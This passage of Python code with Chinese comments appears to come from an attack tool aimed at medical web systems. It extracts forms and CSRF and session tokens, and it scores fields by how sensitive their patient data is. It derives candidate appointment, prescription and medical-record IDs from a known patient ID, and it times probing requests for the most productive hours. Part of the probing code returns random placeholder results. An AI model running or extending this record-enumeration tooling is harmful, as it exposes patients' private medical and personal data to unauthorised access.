        self.extraction_stats = {
            'forms_found': 0,
            'fields_extracted': 0,
            'validation_success': 0,
            'validation_errors': 0
        }
        
        # 智能字段映射
        self.field_mappings = {
            'name': ['name', 'fullname', 'full_name', 'username', 'patient_name', '姓名', '患者姓名'],
            'phone': ['phone', 'telephone', 'tel', 'mobile', 'cell', 'contact', '电话', '手机'],
            'email': ['email', 'mail', 'email_address', 'e_mail', '邮箱', '电子邮件'],
            'id_number': ['id', 'id_number', 'patient_id', 'user_id', 'member_id', '身份证', '编号'],
            'address': ['address', 'addr', 'location', 'residence', '地址', '住址'],
            'date': ['date', 'birth_date', 'birthday', 'appointment_date', '日期', '生日'],
            'medical': ['diagnosis', 'symptoms', 'condition', 'treatment', '诊断', '症状', '治疗']
        }
    
    async def extract_forms_comprehensive(self, url: str, html_content: str) -> Dict[str, Any]:
        """综合表单提取"""
        results = {
            'forms': [],
            'critical_fields': {},
            'security_assessment': {},
            'extraction_metadata': {}
        }
        
        # 1. 基础表单提取
        basic_forms = await self._extract_basic_forms(html_content)
        
        # 2. 智能字段识别
        for form in basic_forms:
            enhanced_form = await self._enhance_form_analysis(form, url)
            results['forms'].append(enhanced_form)
        
        # 3. 关键字段识别
        results['critical_fields'] = self._identify_critical_fields(basic_forms)
        
        # 4. 安全评估
        results['security_assessment'] = self._assess_form_security(basic_forms)
        
        # 5. 批量验证准备
        results['validation_batches'] = self._prepare_validation_batches(basic_forms)
        
        self.extraction_stats['forms_found'] += len(basic_forms)
        self.extraction_stats['fields_extracted'] += sum(len(form.get('fields', [])) for form in basic_forms)
        
        return results
    
    async def _extract_basic_forms(self, html_content: str) -> List[Dict[str, Any]]:
        """基础表单提取"""
        forms = []
        
        # 使用BeautifulSoup或正则提取表单
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.findall(form_pattern, html_content, re.DOTALL | re.IGNORECASE)
        
        for i, form_html in enumerate(form_matches):
            form_data = {
                'form_id': f'form_{i}',
                'html': form_html,
                'action': self._extract_form_action(form_html),
                'method': self._extract_form_method(form_html),
                'fields': self._extract_form_fields(form_html),
                'security_tokens': self._extract_security_tokens(form_html)
            }
            forms.append(form_data)
        
        return forms
    
    def _extract_form_action(self, form_html: str) -> str:
        """提取表单action"""
        action_match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
        return action_match.group(1) if action_match else ""
    
    def _extract_form_method(self, form_html: str) -> str:
        """提取表单method"""
        method_match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
        return method_match.group(1).upper() if method_match else "GET"
    
    def _extract_form_fields(self, form_html: str) -> List[Dict[str, Any]]:
        """提取表单字段"""
        fields = []
        
        # 输入字段
        input_pattern = r'<input[^>]*>'
        input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)
        
        for input_tag in input_matches:
            field = self._parse_input_field(input_tag)
            if field:
                fields.append(field)
        
        # 选择框
        select_pattern = r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>'
        select_matches = re.findall(select_pattern, form_html, re.DOTALL | re.IGNORECASE)
        
        for name, options_html in select_matches:
            field = {
                'type': 'select',
                'name': name,
                'options': self._extract_select_options(options_html),
                'field_category': self.field_recognizer.categorize_field(name)
            }
            fields.append(field)
        
        # 文本区域
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>'
        textarea_matches = re.findall(textarea_pattern, form_html, re.IGNORECASE)
        
        for name in textarea_matches:
            field = {
                'type': 'textarea',
                'name': name,
                'field_category': self.field_recognizer.categorize_field(name)
            }
            fields.append(field)
        
        return fields
    
    def _parse_input_field(self, input_tag: str) -> Optional[Dict[str, Any]]:
        """解析输入字段"""
        # 提取属性
        type_match = re.search(r'type=["\']([^"\']+)["\']', input_tag, re.IGNORECASE)
        name_match = re.search(r'name=["\']([^"\']+)["\']', input_tag, re.IGNORECASE)
        value_match = re.search(r'value=["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
        placeholder_match = re.search(r'placeholder=["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
        
        if not name_match:
            return None
        
        field_type = type_match.group(1) if type_match else 'text'
        field_name = name_match.group(1)
        
        # 跳过隐藏和提交按钮
        if field_type.lower() in ['hidden', 'submit', 'button', 'reset']:
            if field_type.lower() == 'hidden':
                # 隐藏字段可能包含重要信息
                return {
                    'type': 'hidden',
                    'name': field_name,
                    'value': value_match.group(1) if value_match else '',
                    'is_security_token': self._is_security_token(field_name),
                    'field_category': 'security'
                }
            return None
        
        return {
            'type': field_type,
            'name': field_name,
            'value': value_match.group(1) if value_match else '',
            'placeholder': placeholder_match.group(1) if placeholder_match else '',
            'field_category': self.field_recognizer.categorize_field(field_name),
            'security_relevance': self._assess_field_security_relevance(field_name, field_type)
        }
    
    def _extract_select_options(self, options_html: str) -> List[str]:
        """提取选择框选项"""
        option_pattern = r'<option[^>]*value=["\']([^"\']*)["\']'
        return re.findall(option_pattern, options_html, re.IGNORECASE)
    
    def _extract_security_tokens(self, form_html: str) -> Dict[str, str]:
        """提取安全令牌"""
        tokens = {}
        
        # CSRF Token
        csrf_patterns = [
            r'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, form_html, re.IGNORECASE)
            if match:
                tokens['csrf_token'] = match.group(1)
                break
        
        # Session Token
        session_pattern = r'name=["\']session[_-]?token["\'][^>]*value=["\']([^"\']+)["\']'
        session_match = re.search(session_pattern, form_html, re.IGNORECASE)
        if session_match:
            tokens['session_token'] = session_match.group(1)
        
        return tokens
    
    def _is_security_token(self, field_name: str) -> bool:
        """判断是否为安全令牌字段"""
        security_keywords = ['token', 'csrf', 'authenticity', 'nonce', 'signature', 'hash']
        field_name_lower = field_name.lower()
        return any(keyword in field_name_lower for keyword in security_keywords)
    
    async def _enhance_form_analysis(self, form: Dict[str, Any], url: str) -> Dict[str, Any]:
        """增强表单分析"""
        enhanced_form = form.copy()
        
        # 添加表单类型识别
        enhanced_form['form_type'] = self._identify_form_type(form)
        
        # 添加数据敏感性评估
        enhanced_form['sensitivity_score'] = self._calculate_sensitivity_score(form)
        
        # 添加ID字段预测
        enhanced_form['predicted_id_fields'] = self._predict_id_fields(form)
        
        # 添加关联潜力
        enhanced_form['correlation_potential'] = self._assess_correlation_potential(form)
        
        # 添加验证策略
        enhanced_form['validation_strategy'] = self._create_validation_strategy(form, url)
        
        return enhanced_form
    
    def _identify_form_type(self, form: Dict[str, Any]) -> str:
        """识别表单类型"""
        fields = form.get('fields', [])
        field_names = [f.get('name', '').lower() for f in fields]
        
        # 登录表单
        if any(name in field_names for name in ['username', 'password', 'login', 'email']):
            return 'login'
        
        # 注册表单
        if any(name in field_names for name in ['register', 'signup', 'confirm_password']):
            return 'registration'
        
        # 患者信息表单
        if any(name in field_names for name in ['patient_name', 'patient_id', 'diagnosis', 'symptoms']):
            return 'patient_info'
        
        # 预约表单
        if any(name in field_names for name in ['appointment', 'booking', 'schedule']):
            return 'appointment'
        
        # 搜索表单
        if any(name in field_names for name in ['search', 'query', 'find']):
            return 'search'
        
        return 'unknown'
    
    def _calculate_sensitivity_score(self, form: Dict[str, Any]) -> float:
        """计算数据敏感性分数"""
        fields = form.get('fields', [])
        total_score = 0.0
        
        sensitivity_weights = {
            'name': 0.7,
            'phone': 0.8,
            'email': 0.6,
            'id_number': 0.9,
            'address': 0.7,
            'date': 0.5,
            'medical': 1.0,
            'password': 1.0,
            'security': 0.9
        }
        
        for field in fields:
            category = field.get('field_category', 'unknown')
            if category in sensitivity_weights:
                total_score += sensitivity_weights[category]
        
        # 归一化到0-1范围
        max_possible_score = len(fields) * 1.0
        return min(total_score / max(max_possible_score, 1), 1.0)
    
    def _predict_id_fields(self, form: Dict[str, Any]) -> List[str]:
        """预测ID字段"""
        fields = form.get('fields', [])
        id_fields = []
        
        for field in fields:
            field_name = field.get('name', '').lower()
            field_type = field.get('type', '').lower()
            
            # 直接ID字段
            if any(keyword in field_name for keyword in ['id', 'patient_id', 'user_id', 'member_id']):
                id_fields.append(field['name'])
            
            # 数字类型且名称可能是ID
            elif field_type in ['number', 'text'] and any(keyword in field_name for keyword in ['number', 'code', 'ref']):
                id_fields.append(field['name'])
        
        return id_fields
    
    def _assess_correlation_potential(self, form: Dict[str, Any]) -> float:
        """评估关联潜力"""
        fields = form.get('fields', [])
        form_type = form.get('form_type', 'unknown')
        
        # 基础分数基于表单类型
        type_scores = {
            'patient_info': 0.9,
            'appointment': 0.8,
            'registration': 0.7,
            'search': 0.6,
            'login': 0.3,
            'unknown': 0.1
        }
        
        base_score = type_scores.get(form_type, 0.1)
        
        # ID字段数量加分
        id_fields = self._predict_id_fields(form)
        id_bonus = min(len(id_fields) * 0.2, 0.4)
        
        # 医疗相关字段加分
        medical_fields = [f for f in fields if f.get('field_category') == 'medical']
        medical_bonus = min(len(medical_fields) * 0.1, 0.3)
        
        return min(base_score + id_bonus + medical_bonus, 1.0)
    
    def _create_validation_strategy(self, form: Dict[str, Any], url: str) -> Dict[str, Any]:
        """创建验证策略"""
        strategy = {
            'method': form.get('method', 'GET'),
            'action_url': urljoin(url, form.get('action', '')),
            'required_fields': [],
            'optional_fields': [],
            'security_tokens': form.get('security_tokens', {}),
            'batch_size': 10,
            'delay_between_batches': 1.0
        }
        
        # 分类字段为必需和可选
        for field in form.get('fields', []):
            if field.get('type') in ['hidden']:
                continue
            
            field_info = {
                'name': field['name'],
                'type': field['type'],
                'category': field.get('field_category', 'unknown')
            }
            
            # 关键字段标记为必需
            if field.get('field_category') in ['id_number', 'name', 'security']:
                strategy['required_fields'].append(field_info)
            else:
                strategy['optional_fields'].append(field_info)
        
        return strategy
    
    def _identify_critical_fields(self, forms: List[Dict[str, Any]]) -> Dict[str, List]:
        """识别关键字段"""
        critical_fields = {
            'id_fields': [],
            'personal_info': [],
            'medical_info': [],
            'security_fields': []
        }
        
        for form in forms:
            for field in form.get('fields', []):
                category = field.get('field_category', 'unknown')
                field_name = field.get('name', '')
                
                if category == 'id_number':
                    critical_fields['id_fields'].append(field_name)
                elif category in ['name', 'phone', 'email', 'address']:
                    critical_fields['personal_info'].append(field_name)
                elif category == 'medical':
                    critical_fields['medical_info'].append(field_name)
                elif category == 'security':
                    critical_fields['security_fields'].append(field_name)
        
        return critical_fields
    
    def _assess_form_security(self, forms: List[Dict[str, Any]]) -> Dict[str, Any]:
        """评估表单安全性"""
        security_assessment = {
            'csrf_protection': 0,
            'sensitive_data_exposure': 0,
            'insecure_transmission': 0,
            'overall_risk_score': 0.0
        }
        
        total_forms = len(forms)
        if total_forms == 0:
            return security_assessment
        
        for form in forms:
            # CSRF保护检查
            if form.get('security_tokens', {}).get('csrf_token'):
                security_assessment['csrf_protection'] += 1
            
            # 敏感数据暴露检查
            if form.get('sensitivity_score', 0) > 0.7:
                security_assessment['sensitive_data_exposure'] += 1
            
            # 不安全传输检查（如果是GET方法处理敏感数据）
            if form.get('method') == 'GET' and form.get('sensitivity_score', 0) > 0.5:
                security_assessment['insecure_transmission'] += 1
        
        # 计算总体风险分数
        risk_factors = [
            1.0 - (security_assessment['csrf_protection'] / total_forms),  # CSRF保护不足
            security_assessment['sensitive_data_exposure'] / total_forms,   # 敏感数据暴露
            security_assessment['insecure_transmission'] / total_forms      # 不安全传输
        ]
        
        security_assessment['overall_risk_score'] = statistics.mean(risk_factors)
        
        return security_assessment
    
    def _prepare_validation_batches(self, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """准备验证批次"""
        batches = []
        
        for form in forms:
            if form.get('correlation_potential', 0) > 0.5:  # 只对高关联潜力的表单进行批量验证
                strategy = form.get('validation_strategy', {})
                
                batch = {
                    'form_id': form['form_id'],
                    'action_url': strategy.get('action_url', ''),
                    'method': strategy.get('method', 'GET'),
                    'test_fields': strategy.get('required_fields', []),
                    'batch_size': strategy.get('batch_size', 10),
                    'priority': form.get('correlation_potential', 0)
                }
                batches.append(batch)
        
        # 按优先级排序
        batches.sort(key=lambda x: x['priority'], reverse=True)
        
        return batches

class FormFieldRecognizer:
    """表单字段识别器"""
    
    def __init__(self):
        self.category_patterns = {
            'name': [
                r'.*name.*', r'.*姓名.*', r'.*full.*name.*', r'.*patient.*name.*'
            ],
            'phone': [
                r'.*phone.*', r'.*tel.*', r'.*mobile.*', r'.*电话.*', r'.*手机.*'
            ],
            'email': [
                r'.*email.*', r'.*mail.*', r'.*邮箱.*', r'.*电子邮件.*'
            ],
            'id_number': [
                r'.*\bid\b.*', r'.*patient.*id.*', r'.*user.*id.*', r'.*编号.*', r'.*身份证.*'
            ],
            'address': [
                r'.*address.*', r'.*addr.*', r'.*location.*', r'.*地址.*', r'.*住址.*'
            ],
            'date': [
                r'.*date.*', r'.*birth.*', r'.*birthday.*', r'.*日期.*', r'.*生日.*'
            ],
            'medical': [
                r'.*diagnosis.*', r'.*symptom.*', r'.*condition.*', r'.*treatment.*',
                r'.*诊断.*', r'.*症状.*', r'.*治疗.*', r'.*病情.*'
            ],
            'security': [
                r'.*password.*', r'.*token.*', r'.*csrf.*', r'.*auth.*', r'.*密码.*'
            ]
        }
    
    def categorize_field(self, field_name: str) -> str:
        """字段分类"""
        field_name_lower = field_name.lower()
        
        for category, patterns in self.category_patterns.items():
            for pattern in patterns:
                if re.match(pattern, field_name_lower, re.IGNORECASE):
                    return category
        
        return 'unknown'

class IDCorrelationEngine:
    """ID关联推断引擎 - 从一个ID推断相关ID"""
    
    def __init__(self):
        self.correlation_rules = {}
        self.learned_correlations = defaultdict(list)
        self.correlation_confidence = defaultdict(float)
        
        # 医疗系统关联规则
        self.medical_correlation_rules = {
            'patient_to_appointment': {
                'patterns': [
                    ('P{num}', 'A{num}'),           # P1234 -> A1234
                    ('PT{num}', 'APT{num}'),        # PT1234 -> APT1234
                    ('P{num}', '{date}A{num}'),     # P1234 -> 20240101A1234
                ],
                'confidence': 0.8
            },
            'patient_to_prescription': {
                'patterns': [
                    ('P{num}', 'RX{num}'),          # P1234 -> RX1234
                    ('PT{num}', 'PR{num}'),         # PT1234 -> PR1234
                    ('P{num}', '{date}RX{num}'),    # P1234 -> 20240101RX1234
                ],
                'confidence': 0.7
            },
            'patient_to_medical_record': {
                'patterns': [
                    ('P{num}', 'MR{num}'),          # P1234 -> MR1234
                    ('PT{num}', 'REC{num}'),        # PT1234 -> REC1234
                    ('P{num}', '{date}MR{num}'),    # P1234 -> 20240101MR1234
                ],
                'confidence': 0.9
            },
            'appointment_to_prescription': {
                'patterns': [
                    ('A{num}', 'RX{num}'),          # A1234 -> RX1234
                    ('{date}A{num}', '{date}RX{num}'),  # 20240101A001 -> 20240101RX001
                ],
                'confidence': 0.6
            }
        }
    
    def infer_correlated_ids(self, discovered_ids: Dict[str, List], successful_patterns: Dict[str, Any]) -> Dict[str, List]:
        """推断关联ID - 增强跨类型深度关联"""
        correlated_ids = defaultdict(list)
        
        # 从已发现的ID中推断
        for endpoint_pattern, id_list in discovered_ids.items():
            for id_value in id_list:
                correlations = self._generate_correlations_for_id(str(id_value), successful_patterns)
                for corr_type, corr_ids in correlations.items():
                    correlated_ids[f'{endpoint_pattern}_to_{corr_type}'].extend(corr_ids)
        
        # 增强: 跨类型深度关联
        enhanced_correlations = self._perform_deep_cross_correlation(correlated_ids, successful_patterns)
        for corr_type, corr_ids in enhanced_correlations.items():
            correlated_ids[f'deep_{corr_type}'].extend(corr_ids)
        
        # 增强: 时间序列关联
        temporal_correlations = self._generate_temporal_correlations(discovered_ids)
        for corr_type, corr_ids in temporal_correlations.items():
            correlated_ids[f'temporal_{corr_type}'].extend(corr_ids)
        
        # 去重
        for key in correlated_ids:
            correlated_ids[key] = list(set(correlated_ids[key]))
        
        return dict(correlated_ids)
    
    def _generate_correlations_for_id(self, id_value: str, patterns: Dict[str, Any]) -> Dict[str, List]:
        """为单个ID生成关联"""
        correlations = defaultdict(list)
        
        # 检测ID类型
        id_type = self._detect_id_type(id_value)
        
        if id_type in self.medical_correlation_rules:
            # 使用医疗关联规则
            for rule_name, rule_info in self.medical_correlation_rules.items():
                if rule_name.startswith(id_type + '_to_'):
                    target_type = rule_name.split('_to_')[1]
                    generated_ids = self._apply_correlation_rule(id_value, rule_info['patterns'])
                    correlations[target_type].extend(generated_ids)
        
        # 使用学习到的模式
        if id_type in patterns:
            learned_correlations = self._apply_learned_patterns(id_value, patterns[id_type])
            for target_type, ids in learned_correlations.items():
                correlations[target_type].extend(ids)
        
        return correlations
    
    def _detect_id_type(self, id_value: str) -> str:
        """检测ID类型"""
        id_str = str(id_value).upper()
        
        # 患者ID模式
        if re.match(r'^P\d+', id_str) or re.match(r'^PT[-_]?\d+', id_str) or re.match(r'^PAT\d+', id_str):
            return 'patient'
        
        # 预约ID模式
        elif re.match(r'^A\d+', id_str) or re.match(r'^APT[-_]?\d+', id_str) or re.match(r'^\d+A\d+', id_str):
            return 'appointment'
        
        # 处方ID模式
        elif re.match(r'^RX\d+', id_str) or re.match(r'^PR[-_]?\d+', id_str) or re.match(r'^\d+RX\d+', id_str):
            return 'prescription'
        
        # 医疗记录ID模式
        elif re.match(r'^MR\d+', id_str) or re.match(r'^REC[-_]?\d+', id_str) or re.match(r'^\d+MR\d+', id_str):
            return 'medical_record'
        
        # 数字ID
        elif id_str.isdigit():
            return 'numeric'
        
        return 'unknown'
    
    def _apply_correlation_rule(self, id_value: str, patterns: List[Tuple[str, str]]) -> List[str]:
        """应用关联规则"""
        generated_ids = []
        
        for source_pattern, target_pattern in patterns:
            # 解析源模式
            source_match = self._match_pattern(id_value, source_pattern)
            if source_match:
                # 生成目标ID
                target_id = self._generate_from_pattern(target_pattern, source_match)
                if target_id:
                    generated_ids.append(target_id)
        
        return generated_ids
    
    def _match_pattern(self, id_value: str, pattern: str) -> Optional[Dict[str, str]]:
        """匹配模式"""
        # 将模式转换为正则表达式
        regex_pattern = pattern.replace('{num}', r'(\d+)').replace('{date}', r'(\d{8})')
        
        match = re.match(regex_pattern, str(id_value), re.IGNORECASE)
        if match:
            groups = match.groups()
            result = {}
            
            # 提取数字和日期
            num_count = pattern.count('{num}')
            date_count = pattern.count('{date}')
            
            group_index = 0
            if date_count > 0:
                result['date'] = groups[group_index]
                group_index += 1
            if num_count > 0:
                result['num'] = groups[group_index]
            
            return result
        
        return None
    
    def _generate_from_pattern(self, pattern: str, match_data: Dict[str, str]) -> Optional[str]:
        """从模式生成ID"""
        try:
            result = pattern
            
            # 替换占位符
            if '{num}' in pattern and 'num' in match_data:
                result = result.replace('{num}', match_data['num'])
            
            if '{date}' in pattern:
                if 'date' in match_data:
                    result = result.replace('{date}', match_data['date'])
                else:
                    # 使用当前日期
                    today = datetime.now().strftime('%Y%m%d')
                    result = result.replace('{date}', today)
            
            return result
        except Exception:
            return None
    
    def _apply_learned_patterns(self, id_value: str, pattern_info: Dict[str, Any]) -> Dict[str, List]:
        """应用学习到的模式"""
        correlations = defaultdict(list)
        
        # 基于数字规律推断
        if pattern_info.get('type') == 'numeric':
            base_num = int(re.findall(r'\d+', str(id_value))[-1]) if re.findall(r'\d+', str(id_value)) else 0
            
            # 生成相关的数字ID（偏移量）
            offsets = [1000, 2000, 3000, 5000, 10000]  # 常见的系统ID偏移
            for offset in offsets:
                correlated_id = base_num + offset
                correlations['numeric_offset'].append(str(correlated_id))
        
        # 基于前缀规律推断
        elif pattern_info.get('type') == 'composite':
            for prefix_info in pattern_info.get('patterns', {}).values():
                prefix = prefix_info.get('prefix', '')
                if prefix:
                    # 提取数字部分
                    nums = re.findall(r'\d+', str(id_value))
                    if nums:
                        base_num = int(nums[-1])
                        
                        # 生成其他前缀的ID
                        related_prefixes = ['A', 'RX', 'MR', 'APT', 'PR', 'REC']
                        for related_prefix in related_prefixes:
                            if related_prefix != prefix:
                                correlated_id = f"{related_prefix}{base_num:0{prefix_info.get('number_length', 4)}d}"
                                correlations[f'prefix_{related_prefix}'].append(correlated_id)
        
        return correlations
    
    def _perform_deep_cross_correlation(self, basic_correlations: Dict[str, List], patterns: Dict[str, Any]) -> Dict[str, List]:
        """执行深度跨类型关联"""
        deep_correlations = defaultdict(list)
        
        # 分析已有关联中的模式
        correlation_matrix = self._build_correlation_matrix(basic_correlations)
        
        # 跨类型关联: 如果发现患者和预约的关联，推断处方关联
        for source_type, targets in correlation_matrix.items():
            if 'patient' in source_type and 'appointment' in targets:
                # 患者+预约 → 推断处方
                for patient_id in basic_correlations.get(source_type, []):
                    prescription_candidates = self._generate_prescription_from_patient_appointment(patient_id)
                    deep_correlations['patient_appointment_to_prescription'].extend(prescription_candidates)
            
            if 'appointment' in source_type and 'prescription' in targets:
                # 预约+处方 → 推断医疗记录
                for appt_id in basic_correlations.get(source_type, []):
                    record_candidates = self._generate_medical_record_from_appointment(appt_id)
                    deep_correlations['appointment_prescription_to_record'].extend(record_candidates)
        
        # 数字范围扩展关联
        numeric_correlations = self._expand_numeric_correlations(basic_correlations)
        for corr_type, ids in numeric_correlations.items():
            deep_correlations[f'expanded_{corr_type}'].extend(ids)
        
        return deep_correlations
    
    def _build_correlation_matrix(self, correlations: Dict[str, List]) -> Dict[str, List]:
        """构建关联矩阵"""
        matrix = defaultdict(list)
        
        for corr_key, _ in correlations.items():
            if '_to_' in corr_key:
                source, target = corr_key.split('_to_', 1)
                matrix[source].append(target)
        
        return matrix
    
    def _generate_prescription_from_patient_appointment(self, patient_id: str) -> List[str]:
        """从患者和预约信息生成处方ID"""
        prescriptions = []
        
        # 提取患者ID中的数字
        patient_nums = re.findall(r'\d+', str(patient_id))
        if patient_nums:
            base_num = int(patient_nums[-1])
            
            # 生成多种处方ID格式
            prescriptions.extend([
                f"RX{base_num:04d}",
                f"PR-2024-{base_num:03d}",
                f"MED{base_num:06d}",
                f"PRESC{base_num}",
                f"{datetime.now().strftime('%Y%m%d')}RX{base_num:03d}"
            ])
        
        return prescriptions
    
    def _generate_medical_record_from_appointment(self, appointment_id: str) -> List[str]:
        """从预约信息生成医疗记录ID"""
        records = []
        
        # 提取预约ID中的数字
        appt_nums = re.findall(r'\d+', str(appointment_id))
        if appt_nums:
            base_num = int(appt_nums[-1])
            
            # 生成多种医疗记录ID格式
            records.extend([
                f"MR{base_num:04d}",
                f"REC-2024-{base_num:03d}",
                f"CHT{base_num:06d}",
                f"CHART{base_num}",
                f"{datetime.now().strftime('%Y%m%d')}MR{base_num:03d}"
            ])
        
        return records
    
    def _expand_numeric_correlations(self, correlations: Dict[str, List]) -> Dict[str, List]:
        """扩展数字关联"""
        expanded = defaultdict(list)
        
        for corr_type, id_list in correlations.items():
            if not id_list:
                continue
            
            # 提取所有数字ID
            numeric_ids = []
            for id_val in id_list:
                nums = re.findall(r'\d+', str(id_val))
                if nums:
                    numeric_ids.extend([int(n) for n in nums])
            
            if len(numeric_ids) >= 2:
                # 分析数字范围和间隔
                min_num, max_num = min(numeric_ids), max(numeric_ids)
                range_size = max_num - min_num
                
                # 如果范围合理，生成范围内的其他ID
                if 1 <= range_size <= 1000:
                    # 生成范围内的一些ID
                    step = max(1, range_size // 20)  # 最多生成20个中间值
                    for num in range(min_num, max_num + 1, step):
                        expanded[corr_type].append(str(num))
                        
                        # 也生成带前缀的版本
                        for prefix in ['P', 'A', 'RX', 'MR']:
                            expanded[f'{corr_type}_with_prefix'].append(f"{prefix}{num:04d}")
        
        return expanded
    
    def _generate_temporal_correlations(self, discovered_ids: Dict[str, List]) -> Dict[str, List]:
        """生成时间序列关联"""
        temporal_correlations = defaultdict(list)
        
        # 分析时间相关的ID
        time_based_ids = defaultdict(list)
        
        for endpoint, id_list in discovered_ids.items():
            for id_val in id_list:
                id_str = str(id_val)
                
                # 检测日期模式
                date_matches = re.findall(r'(\d{8})', id_str)  # YYYYMMDD
                if date_matches:
                    for date_str in date_matches:
                        try:
                            date_obj = datetime.strptime(date_str, '%Y%m%d')
                            time_based_ids[date_str].append(id_str)
                        except ValueError:
                            continue
        
        # 基于时间生成关联
        for date_str, ids in time_based_ids.items():
            if len(ids) >= 2:
                try:
                    base_date = datetime.strptime(date_str, '%Y%m%d')
                    
                    # 生成相邻日期的ID
                    for delta_days in [-7, -3, -1, 1, 3, 7, 30]:  # 前后几天/周/月
                        target_date = base_date + timedelta(days=delta_days)
                        target_date_str = target_date.strftime('%Y%m%d')
                        
                        # 为每个原始ID生成对应时间的版本
                        for original_id in ids[:5]:  # 限制数量
                            # 替换日期部分
                            new_id = original_id.replace(date_str, target_date_str)
                            temporal_correlations[f'temporal_offset_{delta_days}d'].append(new_id)
                            
                except ValueError:
                    continue
        
        return temporal_correlations
    
    def learn_correlation_from_success(self, source_id: str, target_endpoint: str, successful_id: str):
        """从成功的查询中学习关联"""
        correlation_key = f"{self._detect_id_type(source_id)}_to_{self._detect_id_type(successful_id)}"
        
        self.learned_correlations[correlation_key].append({
            'source': source_id,
            'target': successful_id,
            'endpoint': target_endpoint,
            'timestamp': datetime.now().isoformat()
        })
        
        # 更新置信度
        self.correlation_confidence[correlation_key] = min(
            self.correlation_confidence[correlation_key] + 0.1, 
            0.95
        )
    
    def get_correlation_stats(self) -> Dict[str, Any]:
        """获取关联统计"""
        return {
            'learned_correlations': len(self.learned_correlations),
            'correlation_types': list(self.learned_correlations.keys()),
            'confidence_scores': dict(self.correlation_confidence),
            'total_correlation_samples': sum(len(corrs) for corrs in self.learned_correlations.values())
        }

class TimeWindowOptimizer:
    """时间窗口优化器 - 智能探测系统活跃时间段"""
    
    def __init__(self):
        self.activity_patterns = {}
        self.time_zones = ['UTC', 'Asia/Tokyo', 'Asia/Shanghai', 'America/New_York']
        self.detection_samples = defaultdict(list)
        self.optimal_windows = {}
        
    async def detect_optimal_time_windows(self, test_endpoints: List[str], session) -> Dict[str, Any]:
        """检测最优时间窗口"""
        results = {
            'active_periods': {},
            'inactive_periods': {},
            'recommended_schedule': {},
            'efficiency_gain': 0.0
        }
        
        logger.info("[+] 开始时间窗口优化检测...")
        
        # 1. 采样不同时间段
        time_samples = await self._sample_different_time_periods(test_endpoints, session)
        
        # 2. 分析活跃模式
        activity_analysis = self._analyze_activity_patterns(time_samples)
        
        # 3. 识别工作时间模式
        work_hour_patterns = self._detect_work_hour_patterns(time_samples)
        
        # 4. 生成优化建议
        optimization_strategy = self._generate_optimization_strategy(activity_analysis, work_hour_patterns)
        
        results.update({
            'time_samples': len(time_samples),
            'activity_analysis': activity_analysis,
            'work_hour_patterns': work_hour_patterns,
            'optimization_strategy': optimization_strategy
        })
        
        return results
    
    async def _sample_different_time_periods(self, test_endpoints: List[str], session) -> List[Dict[str, Any]]:
        """采样不同时间段"""
        samples = []
        current_time = datetime.now()
        
        # 测试最近7天的不同时间段
        for days_ago in range(7):
            test_date = current_time - timedelta(days=days_ago)
            
            # 测试不同小时
            for hour in [0, 6, 9, 12, 15, 18, 21]:  # 一天中的关键时间点
                test_time = test_date.replace(hour=hour, minute=0, second=0, microsecond=0)
                
                # 生成该时间的测试ID
                test_ids = self._generate_time_based_test_ids(test_time)
                
                # 测试少量端点
                for endpoint in test_endpoints[:2]:  # 只测试前2个端点
                    for test_id in test_ids[:3]:  # 每个时间只测试3个ID
                        sample = await self._test_single_time_sample(session, endpoint, test_id, test_time)
                        if sample:
                            samples.append(sample)
                        
                        # 短暂延迟
                        await asyncio.sleep(0.1)
        
        return samples
    
    def _generate_time_based_test_ids(self, test_time: datetime) -> List[str]:
        """生成基于时间的测试ID"""
        date_str = test_time.strftime('%Y%m%d')
        
        test_ids = [
            f"{date_str}001",    # 日期+序号
            f"{date_str}01",     # 日期+短序号
            f"P{date_str}01",    # 前缀+日期+序号
            f"A{date_str}01",    # 预约+日期+序号
            f"{test_time.year}{test_time.month:02d}{test_time.day:02d}001"  # 完整日期格式
        ]
        
        return test_ids
    
    async def _test_single_time_sample(self, session, endpoint: str, test_id: str, test_time: datetime) -> Optional[Dict[str, Any]]:
        """测试单个时间样本"""
        url = urljoin(self.target_url if hasattr(self, 'target_url') else 'http://example.com', 
                     endpoint.replace('{id}', test_id))
        
        try:
            start_time = time.time()
            
            # 这里应该使用实际的请求方法，暂时模拟
            # async with session.get(url, timeout=5) as resp:
            #     response_time = time.time() - start_time
            #     return {
            #         'test_time': test_time.isoformat(),
            #         'hour': test_time.hour,
            #         'weekday': test_time.weekday(),
            #         'endpoint': endpoint,
            #         'test_id': test_id,
            #         'status_code': resp.status,
            #         'response_time': response_time,
            #         'success': resp.status == 200
            #     }
            
            # 模拟响应（实际使用时应该移除）
            response_time = random.uniform(0.5, 3.0)
            success = random.random() > 0.7  # 30%成功率
            
            return {
                'test_time': test_time.isoformat(),
                'hour': test_time.hour,
                'weekday': test_time.weekday(),
                'endpoint': endpoint,
                'test_id': test_id,
                'status_code': 200 if success else 404,
                'response_time': response_time,
                'success': success
            }
            
        except Exception as e:
            logger.debug(f"时间窗口测试异常: {e}")
            return None
    
    def _analyze_activity_patterns(self, samples: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析活跃模式"""
        if not samples:
            return {'error': 'no_samples'}
        
        # 按小时分组
        hourly_stats = defaultdict(list)
        for sample in samples:
            hour = sample['hour']
            hourly_stats[hour].append(sample)
        
        # 计算每小时的统计
        hourly_analysis = {}
        for hour, hour_samples in hourly_stats.items():
            success_rate = sum(1 for s in hour_samples if s['success']) / len(hour_samples)
            avg_response_time = statistics.mean([s['response_time'] for s in hour_samples])
            
            hourly_analysis[hour] = {
                'sample_count': len(hour_samples),
                'success_rate': success_rate,
                'avg_response_time': avg_response_time,
                'activity_score': success_rate * (1.0 / max(avg_response_time, 0.1))  # 成功率/响应时间
            }
